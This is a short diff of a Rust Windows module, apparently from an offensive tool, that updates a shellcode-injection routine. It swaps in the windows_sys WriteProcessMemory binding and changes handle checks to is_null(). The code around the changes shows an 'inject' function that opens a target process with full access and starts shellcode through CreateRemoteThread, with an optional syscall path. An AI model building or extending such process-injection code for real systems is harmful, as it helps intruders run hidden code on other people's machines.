@@ -27,16 +27,16 @@ mod win {
         CreateProcessW, CreateRemoteThread, OpenProcess, ResumeThread, PROCESS_ALL_ACCESS,
         PROCESS_INFORMATION, STARTUPINFOW, CREATE_SUSPENDED,
     };
-
-    extern "system" {
-        fn WriteProcessMemory(
-            hProcess: HANDLE,
-            lpBaseAddress: *mut core::ffi::c_void,
-            lpBuffer: *const core::ffi::c_void,
-            nSize: usize,
-            lpNumberOfBytesWritten: *mut usize,
-        ) -> BOOL;
-    }
+    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+    // unsafe extern "system" {
+    //     fn WriteProcessMemory(
+    //         hProcess: HANDLE,
+    //         lpBaseAddress: *mut core::ffi::c_void,
+    //         lpBuffer: *const core::ffi::c_void,
+    //         nSize: usize,
+    //         lpNumberOfBytesWritten: *mut usize,
+    //     ) -> BOOL;
+    // }
 
     // ─── Win32 API injection (original path) ────────────────────────────
 
@@ -101,7 +101,7 @@ mod win {
             0,
             core::ptr::null_mut(),
         );
-        if thread == 0 {
+        if thread.is_null() {
             return (
                 1,
                 String::new(),
@@ -220,7 +220,7 @@ mod win {
     pub fn inject(pid: u32, shellcode: &[u8], use_syscalls: bool) -> Result<(i32, String, String)> {
         unsafe {
             let process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-            if process == 0 {
+            if process.is_null() {
                 return Ok((
                     1,
                     String::new(),
